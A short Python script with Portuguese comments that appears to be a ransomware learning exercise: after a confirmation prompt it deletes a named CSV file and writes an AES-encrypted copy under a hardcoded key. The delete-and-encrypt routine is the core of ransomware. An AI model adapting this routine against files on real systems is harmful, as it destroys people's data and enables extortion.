import os
import pyaes

def Encrypt():
    print("Cuidado você está preste a cryptografar um arquivo, risco de perda total...")
    res = str(input("Deseja Cryptografar o Arquivo? "))

    if res == 'SIM' or res == 'sim':
        # Vamos abrir o file a ser criptografado
        name_File = "Europa.csv"
        file = open(name_File, 'rb')
        fileData = file.read()
        file.close()

        # Removemos o name_File pois ele já está salvo em file
        os.remove(name_File)

        # Passamos a chave
        key = b"luizdeveaprender"
        aes = pyaes.AESModeOfOperationCTR(key)

        # Cryptografando o fileData
        crypto_File = aes.encrypt(fileData)

        # vamos salvar o fileData ja cryptografado
        new_file = name_File + ".testeransmware"
        new_file = open(f'{new_file}','wb')
        new_file.write(crypto_File)
        new_file.close()
        print("Arquivo Cryptografado com sucesso! ...")
        return
    print("Você escolheu por não cryptografar...")


if __name__ == '__main__':
    Encrypt()
